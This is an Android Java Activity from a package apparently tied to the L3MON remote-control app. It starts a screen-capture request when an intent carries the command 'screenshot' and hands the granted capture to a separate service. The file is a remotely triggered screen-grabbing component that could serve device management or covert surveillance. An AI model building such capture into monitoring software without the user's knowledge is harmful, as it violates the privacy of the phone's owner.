package com.etechd.l3mon;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;

public class MDMActivity extends Activity {
    private static final int REQUEST_SCREENSHOT = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        String action = getIntent().getStringExtra("action");
        if ("screenshot".equals(action)) {
            requestScreenshot();
        } else {
            finish();
        }
    }

    private void requestScreenshot() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            startActivityForResult(manager.createScreenCaptureIntent(), REQUEST_SCREENSHOT);
        } else {
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREENSHOT) {
            if (resultCode == RESULT_OK && data != null) {
                MDMActionHandler.startScreenCaptureService(this, data);
            }
            finish();
        }
    }
}
